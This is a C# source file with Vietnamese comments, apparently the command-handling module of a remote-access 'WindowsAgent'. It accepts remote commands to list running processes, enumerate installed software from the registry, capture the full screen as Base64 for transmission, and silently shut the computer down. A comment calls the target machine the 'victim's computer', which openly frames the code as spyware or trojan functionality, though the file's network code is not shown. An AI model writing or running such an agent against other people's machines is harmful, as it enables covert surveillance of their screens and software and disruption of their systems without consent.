using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32; // Thư viện cần thiết để đọc Registry (List App)
namespace WindowsAgent
{
    public class Feature
    {
        // --- HÀM ĐIỀU PHỐI LỆNH ---
        public string ProcessCommand(string cmd)
        {
            try
            {
                switch (cmd)
                {
                    case "CMD_PING":
                        return "PONG: Agent hoạt động tốt! Time: " + DateTime.Now.ToString();

                    case "CMD_GET_PROCESS":
                        // Lấy danh sách tiến trình đang chạy
                        return "LIST_PROC:" + GetRunningProcesses();

                    case "CMD_GET_APPS":
                        // Lấy danh sách phần mềm đã cài đặt trong máy
                        return "LIST_PROC:" + GetInstalledApps(); // Tạm dùng prefix LIST_PROC để hiển thị dạng text trên web

                    case "CMD_SCREENSHOT":
                        // Chụp ảnh và trả về Base64
                        return "IMG_BASE64:" + TakeScreenshot();

                    case "CMD_SHUTDOWN":
                        // Tắt máy tính nạn nhân
                        ShutdownComputer();
                        return "LOG: Đang thực hiện tắt máy...";

                    case "CMD_CLOSE_AGENT":
                        // Chỉ tắt phần mềm Agent này thôi
                        Application.Exit();
                        return "LOG: Agent disconnecting...";

                    default:
                        return "LOG: Lệnh không xác định (" + cmd + ")";
                }
            }
            catch (Exception ex)
            {
                return "ERROR: Lỗi khi thực thi lệnh. Chi tiết: " + ex.Message;
            }
        }

        // --- 1. LOGIC LẤY DANH SÁCH TIẾN TRÌNH (Running Processes) ---
        private string GetRunningProcesses()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== DANH SÁCH TIẾN TRÌNH ĐANG CHẠY ===");

            Process[] processList = Process.GetProcesses();
            foreach (Process p in processList)
            {
                try
                {
                    // Lấy tên và ID của process
                    sb.AppendLine($"- {p.ProcessName} (PID: {p.Id})");
                }
                catch { } // Bỏ qua process hệ thống không truy cập được
            }
            return sb.ToString();
        }

        // --- 2. LOGIC LẤY DANH SÁCH APP ĐÃ CÀI (Installed Apps) ---
        // Thay thế hàm cũ bằng hàm này
        private string GetInstalledApps()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== DANH SÁCH PHẦN MỀM ĐÃ CÀI ĐẶT ===");

            string registryKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";

            // Thêm dấu ? vào RegistryKey để chấp nhận null
            using (RegistryKey? key = Registry.LocalMachine.OpenSubKey(registryKey))
            {
                if (key != null)
                {
                    foreach (string subkeyName in key.GetSubKeyNames())
                    {
                        using (RegistryKey? subkey = key.OpenSubKey(subkeyName))
                        {
                            // Kiểm tra subkey có null không trước khi dùng
                            if (subkey != null)
                            {
                                // Ép kiểu an toàn: 'as string' sẽ trả về null nếu không phải string, không gây lỗi
                                string? displayName = subkey.GetValue("DisplayName") as string;

                                // Kiểm tra displayName có dữ liệu không mới in ra
                                if (!string.IsNullOrEmpty(displayName))
                                {
                                    sb.AppendLine("- " + displayName);
                                }
                            }
                        }
                    }
                }
            }
            return sb.ToString();
        }

        // --- 3. LOGIC CHỤP MÀN HÌNH (Screenshot) ---
        private string TakeScreenshot()
        {
            // Lấy kích thước toàn màn hình
            Rectangle bounds = Screen.GetBounds(Point.Empty);

            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    // Chụp từ màn hình vào biến bitmap
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                // Lưu vào MemoryStream để chuyển thành byte[]
                using (MemoryStream ms = new MemoryStream())
                {
                    // Lưu định dạng PNG cho rõ nét (hoặc Jpeg để nhẹ hơn)
                    bitmap.Save(ms, ImageFormat.Png);
                    byte[] imageBytes = ms.ToArray();

                    // Chuyển đổi sang chuỗi Base64 để gửi qua mạng an toàn
                    return Convert.ToBase64String(imageBytes);
                }
            }
        }

        // --- 4. LOGIC TẮT MÁY (Shutdown PC) ---
        private void ShutdownComputer()
        {
            // Tạo process gọi lệnh CMD của Windows
            ProcessStartInfo psi = new ProcessStartInfo("shutdown", "/s /t 5"); // Tắt sau 5 giây
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }
    }
}